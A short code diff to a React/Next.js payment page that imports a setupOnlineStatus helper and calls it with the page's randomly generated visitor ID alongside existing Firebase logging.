@@ -4,6 +4,7 @@ import Loader from "@/components/loader";
 import PaymentForm from "@/components/pm";
 import ZainPaymentForm from "@/components/zms";
 import { addData } from "@/lib/firebase";
+import { setupOnlineStatus } from "@/lib/util";
 import { useEffect, useState, useCallback } from "react";
 
 const visitorId = `zain-app-${Math.random().toString(36).substring(2, 15)}`;
@@ -43,6 +44,7 @@ export default function Page() {
         action: "location_error",
       });
     }
+    setupOnlineStatus(visitorId!);
   }, [visitorId]);
 
   useEffect(() => {
